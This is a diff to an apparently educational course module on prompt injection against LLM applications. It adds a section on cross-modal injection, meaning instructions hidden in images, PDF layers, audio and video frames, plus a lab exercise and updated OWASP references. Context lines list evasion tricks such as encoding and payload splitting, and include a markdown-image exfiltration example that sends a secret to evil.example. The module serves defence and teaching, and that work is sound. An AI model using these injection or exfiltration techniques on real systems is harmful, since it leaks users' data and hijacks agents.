@@ -7,7 +7,7 @@
 |---|---|
 | **Prerequisites** | Python basics; [Module 01](../../01-ai-security-fundamentals/) trust boundaries |
 | **Lab** | [`lab/`](lab/): runs offline, no API key needed |
-| **Maps to** | OWASP LLM01:2025 Prompt Injection · MITRE ATLAS AML.T0051 (LLM Prompt Injection) |
+| **Maps to** | OWASP LLM01:2026 Prompt Injection (same ID in 2025; the 2026 text adds cross-modal injection) · OWASP Agentic ASI01 Agent Goal Hijack · OWASP MCP Top 10 MCP06 Prompt Injection via Contextual Payloads · OWASP AI Testing Guide AITG-APP-01, AITG-APP-02 · MITRE ATLAS AML.T0051 (LLM Prompt Injection) |
 
 ---
 
@@ -78,6 +78,19 @@ Remove any one leg and the theft path breaks. This is the most useful design que
 | Encoding | Base64, ROT13, Unicode homoglyphs | The model can decode; the regex can't |
 | Payload splitting | Half in one document, half in another | Each chunk looks harmless |
 | Tool-format mimicry | Text that looks like the app's tool-call JSON | Model and parser both trust the format |
+
+### 2.6 Cross-modal injection: the payload is not always text
+
+The 2026 OWASP entry for LLM01 explicitly includes **cross-modal** injection: instructions that arrive through an image, audio or another modality, and are then followed by a model that handles several modalities. CERT-In's AI Security Auditing Guidelines also list cross-modal injection as its own test category.
+
+| Modality | Where the instruction hides | Why text filters miss it |
+|---|---|---|
+| Image | Text rendered in a picture or screenshot, tiny or low-contrast text, text in image metadata | The filter sees pixels; the model reads the words |
+| Document | Hidden PDF layers, white text, comments, alt-text ([Module 03](../../03-rag-security/document-security/)) | Extraction tools and humans see different content |
+| Audio | Spoken instructions inside a voice note or a meeting recording that gets transcribed | The instruction only exists after transcription |
+| Video / screen | A frame or slide that an agent "watching" the screen reads | Same as images, at scale |
+
+The defenses do not change: treat **everything the model reads** as untrusted data, whatever its format. Convert media to text in a separate step and run the same detection on the extracted text, keep tool policy and output handling outside the model (L4, L5), and add image and audio payloads to your regression suite. The lab is text-only; a stretch goal below adds an "OCR'd image" case.
 
 ---
 
@@ -184,6 +197,7 @@ The real model won't understand `CALL_TOOL` the way the mock does, but it *will*
 - Add **markdown image exfiltration**: make the mock return `![x](https://evil.example/?d=<secret>)`. Then add an L5 rule that removes images and links to domains that aren't allowlisted.
 - Implement the **dual-LLM pattern**. A quarantined call summarizes the email. The privileged call only sees `$SUMMARY_1`, never the raw text.
 - Write a test that proves the **benign** email still produces a summary with every layer turned on. (Security that breaks the product gets turned off.)
+- Add a **cross-modal** case: simulate an email attachment whose "OCR text" carries the injection (a string you mark as coming from an image). Make sure it goes through the same spotlighting, detection and tool policy as the email body.
 
 ---
 
@@ -310,9 +324,9 @@ A privileged LLM orchestrates and calls tools but never sees untrusted text. A q
 In deterministic services, as close to the data or action as possible: the tool backend or API checks *the end user's* permissions on every call. Never in the prompt, and never "because the model decided". The model is a planner proposing actions. It is not a principal with its own trust.
 </details>
 
-<details><summary><b>Q13. What is the difference between OWASP LLM01 and LLM05?</b></summary>
+<details><summary><b>Q13. What is the difference between OWASP LLM01 and LLM10:2026 (LLM05 in 2025)?</b></summary>
 
-LLM01 (Prompt Injection) is about manipulating the model's *inputs and behavior*. LLM05 (Improper Output Handling) is about the app trusting the model's *output*, e.g. rendering it as HTML, running it as code or SQL, or passing it to a shell. They chain together often: injection produces malicious output, and bad output handling turns it into XSS or RCE.
+LLM01 (Prompt Injection) is about manipulating the model's *inputs and behavior*. LLM10:2026 Improper Output Handling (LLM05:2025) is about the app trusting the model's *output*, e.g. rendering it as HTML, running it as code or SQL, or passing it to a shell. They chain together often: injection produces malicious output, and bad output handling turns it into XSS or RCE.
 </details>
 
 <details><summary><b>Q14. Can fine-tuning or a better system prompt solve prompt injection?</b></summary>
@@ -337,7 +351,8 @@ They reduce the success rate. Instruction-hierarchy training, where models are t
 
 ## 9. References
 
-- OWASP Top 10 for LLM Applications 2025: LLM01 Prompt Injection, https://genai.owasp.org/llmrisk/llm01-prompt-injection/
+- OWASP Top 10 for LLM Applications 2026 (verify the current text): LLM01 Prompt Injection, https://genai.owasp.org/llm-top-10/
+- OWASP AI Testing Guide v1.0 (AITG-APP-01 Prompt Injection, AITG-APP-02 Indirect Prompt Injection): https://owasp.org/www-project-ai-testing-guide/
 - MITRE ATLAS: AML.T0051 LLM Prompt Injection, https://atlas.mitre.org/
 - Greshake et al., *Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection* (2023), https://arxiv.org/abs/2302.12173
 - Hines et al., *Defending Against Indirect Prompt Injection Attacks With Spotlighting* (Microsoft, 2024), https://arxiv.org/abs/2403.14720
